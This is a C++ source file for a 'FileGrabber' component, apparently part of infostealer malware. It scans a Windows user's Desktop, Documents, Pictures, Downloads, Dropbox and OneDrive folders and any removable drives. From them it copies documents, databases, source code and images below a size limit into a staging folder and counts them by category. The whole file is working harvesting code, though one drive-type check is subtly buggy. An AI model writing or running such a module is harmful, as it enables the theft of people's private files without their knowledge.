#include "FileGrabber.h"
#include "Counter.h"
#include <iostream>
#include <string>
#include <Windows.h>
#include <Shlwapi.h>
#include <sstream>
#include <regex>
#include <fstream>
#include <ShlObj.h>  
#include <unordered_map>
#include <vector>
#include <thread>


#include <algorithm>

#pragma comment(lib,"Shlwapi.lib")
using namespace std;

 //Static variable for saving path
std::string FileGrabber::_savePath = ""; // This variable holds the base path where files will be saved.

// Static vector to store target directories obtained from GetSpecialFolderPaths
std::vector<std::string> FileGrabber::targetDirs = GetSpecialFolderPaths(); // List of special folder paths initialized.

std::string FileGrabber::GetSpecialFolderPath(int nFolder)
{
    // Buffer to store the path
    char szPath[MAX_PATH]; // MAX_PATH is a constant that defines the maximum allowable path length.

    // Fetch the path of the special folder specified by nFolder
    if (SHGetSpecialFolderPathA(NULL, szPath, nFolder, FALSE)) {
        return std::string(szPath); // Convert and return the path as a std::string if successful.
    }
    else {
        return ""; // Return an empty string if the folder path cannot be retrieved.
    }
}

std::vector<std::string> FileGrabber::GetSpecialFolderPaths()
{
    // Retrieve a collection of special folder paths
    std::vector<std::string> dirs = {
        GetSpecialFolderPath(CSIDL_DESKTOP), // Desktop folder path.
        GetSpecialFolderPath(CSIDL_PERSONAL), // Documents folder path.
        GetSpecialFolderPath(CSIDL_MYPICTURES), // Pictures folder path.
        GetSpecialFolderPath(CSIDL_PROFILE) + "\\Downloads", // Downloads folder path.
        GetSpecialFolderPath(CSIDL_PROFILE) + "\\Dropbox", // Dropbox folder path.
        GetSpecialFolderPath(CSIDL_PROFILE) + "\\OneDrive", // OneDrive folder path.
    };
    return dirs; // Return the list of directories.
}

std::string FileGrabber::RecordFileType(Config::FileType fileType)
{
    // Map a file type to its category name and increment the respective counter
    switch (fileType) {
    case Config::FileType::Document:
        Counter::GrabberDocuments++; // Increment document file counter.
        return "Document"; // Return the category name.
    case Config::FileType::DataBase:
        Counter::GrabberDatabases++; // Increment database file counter.
        return "DataBase";
    case Config::FileType::SourceCode:
        Counter::GrabberSourceCodes++; // Increment source code file counter.
        return "SourceCode";
    case Config::FileType::Image:
        Counter::GrabberImages++; // Increment image file counter.
        return "Image";
    default:
        return ""; // Return empty if no match is found.
    }
}

std::string FileGrabber::DetectFileType(const std::string& extensionName)
{
    // Convert the file extension to lowercase for case-insensitive comparison
    std::string fileExtension = extensionName;
    std::transform(fileExtension.begin(), fileExtension.end(), fileExtension.begin(), ::tolower);

    // Remove the leading '.' from the extension if present
    fileExtension.erase(std::remove(fileExtension.begin(), fileExtension.end(), '.'), fileExtension.end());

    // Check if the extension matches any predefined file types
    for (const auto& type : Config::GrabberFileTypes_unordered_map) {
        if (std::find(type.second.begin(), type.second.end(), fileExtension) != type.second.end()) {
            return RecordFileType(type.first); // Record and return the file type if a match is found.
        }
    }

    return ""; // Return an empty string if the file type is unknown.
}

void FileGrabber::GrabFile(const std::string& filePath, const std::string& savePath)
{
    // Structure to hold file attributes
    WIN32_FILE_ATTRIBUTE_DATA fileData;

    // Retrieve file attributes
    if (!GetFileAttributesExA(filePath.c_str(), GetFileExInfoStandard, &fileData)) {
        return; // Exit if attributes cannot be retrieved.
    }

    // Extract file name from file path
    std::string fileName = filePath.substr(filePath.find_last_of("\\/") + 1);
    if (fileName == "desktop.ini") {
        return; // Skip processing for 'desktop.ini' files.
    }

    // Check if the file size exceeds the configured limit
    if (fileData.nFileSizeHigh > 0 || fileData.nFileSizeLow > static_cast<DWORD>(Config::GrabberSizeLimit)) {
        return;
    }

    // Determine the file type based on its extension
    std::string fileType = DetectFileType(fileName.substr(fileName.find_last_of(".") + 1));
    if (fileType.empty()) {
        return; // Skip files with unknown types.
    }

    // Construct directory and file paths for copying
    std::string copyDirectoryName = FileGrabber::_savePath + "\\DRIVE-" + filePath.substr(0, filePath.find_last_of("\\/"));
    copyDirectoryName.replace(copyDirectoryName.find(":"), 1, ""); // Replace ':' to make the path valid on Windows.

    std::string copyFileName = copyDirectoryName + "\\" + fileName;
    std::string fullPath = savePath + copyDirectoryName;

    // Create the directory structure if it doesn't exist
    if (SHCreateDirectoryExA(NULL, fullPath.c_str(), NULL) != ERROR_SUCCESS) {
        return; // Exit if the directory cannot be created.
    }

    fullPath += "\\" + fileName; // Append the file name to the destination path.

    // Copy the file to the destination directory
    if (!CopyFileA(filePath.c_str(), fullPath.c_str(), FALSE)) {
        return; // Exit if the file copy fails.
    }
}

void FileGrabber::grabDirectory(const std::string& path, std::string& savePath, int depth, int max_depth)
{
    // Create a search pattern to find all files and directories in the given path
    std::string search_pattern = path + "\\*.*";

    WIN32_FIND_DATAA find_data; // Structure to store file or directory information.
    HANDLE find_handle = FindFirstFileA(search_pattern.c_str(), &find_data); // Start searching the directory.

    if (find_handle == INVALID_HANDLE_VALUE) {
        // If the handle is invalid, the directory could not be opened.
        return;
    }

    do {
        // Check if the found item is a directory
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip the current (".") and parent ("..") directory entries
            if ((strcmp(find_data.cFileName, ".") != 0) && (strcmp(find_data.cFileName, "..") != 0)) {
                // If the maximum depth is reached, do not descend further
                if (depth >= max_depth) {
                    continue;
                }

                // Construct the path for the child directory
                std::string child_path = path + "\\" + find_data.cFileName;

                // Recursively process the child directory
                grabDirectory(child_path, savePath, depth + 1, max_depth);
            }
        }
        else {
            // If it's a file, construct its full path
            std::string filePath = path + std::string("\\") + find_data.cFileName;

            //for (int num = 0; num < filePath ; num++)

            // Process the file
            GrabFile(filePath, savePath);
        }
    } while (FindNextFileA(find_handle, &find_data) != 0); // Continue to the next file or directory.

    FindClose(find_handle); // Close the directory handle when finished.
}

void FileGrabber::Run(std::string savePath)
{
    try {
        // Get a bitmask representing all logical drives on the system
        DWORD drives = GetLogicalDrives();

        // Iterate through possible drive letters ('A' to 'Z')
        for (char letter = 'A'; letter <= 'Z'; letter++) {

            // Check if the current drive is active and if it is a removable drive
            if ((drives & 1) && (GetDriveTypeA(&letter) == DRIVE_REMOVABLE)) {

                // Construct the root directory for the removable drive
                std::string rootDir = std::string(1, letter) + ":\\";

                // Add the drive's root directory to the target directories list
                FileGrabber::targetDirs.push_back(rootDir);
            }

            // Shift the bitmask to check the next drive
            drives >>= 1;
        }

        // Ensure the save directory exists
        if (!CreateDirectoryA(savePath.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {

            // Throw an error if the directory cannot be created
            throw std::runtime_error("Failed to create directory: " + savePath);
        }


        // Vector to store threads for concurrent directory processing
        std::vector<std::thread> threads;

        // Iterate over the target directories and start a thread for each
        for (const auto& dir : FileGrabber::targetDirs) {
            try {
                // Create a new thread to process the directory
                threads.emplace_back(std::thread(grabDirectory, dir, std::ref(savePath), 0, 1));
            }
            catch (...) {
                // Ignore exceptions that may occur during thread creation
            }
        }

        // Allow some time for threads to run (3 seconds)
        Sleep(3000);

        // Wait for all threads to finish execution
        for (auto& t : threads)
            t.join();
    }
    catch (const std::exception& ex) {
        // Handle exceptions that occur during the process
        std::cerr << ex.what() << std::endl;
    }

    return; // End the function.
}
